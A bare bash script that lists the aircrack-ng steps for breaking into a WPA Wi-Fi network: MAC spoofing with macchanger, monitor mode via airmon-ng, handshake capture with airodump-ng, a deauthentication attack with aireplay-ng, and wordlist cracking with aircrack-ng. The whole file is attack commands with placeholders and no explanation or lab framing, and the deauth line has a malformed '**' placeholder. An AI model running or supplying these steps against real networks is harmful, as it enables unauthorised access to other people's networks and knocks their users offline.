#!/bin/bash
lsusb
iwconfig
sudo ifconfig wlan0 down
sudo macchanger -a wlan0
sudo ifconfig wlan0 up  
sudo airmon-ng check kill
sudo airmon-ng start wlan0
iwconfig
sudo airodump-ng wlan0
sudo airodump-ng {interface} -c {channel} -d {bssid} -w {filename}
sudo aireplay-ng --deauth 10 -a ** wlan0 
sudo aircrack-ng -w {WORDLIST} -b {BSSID_of_ACCESS_POINT} {PCAP_FILE}
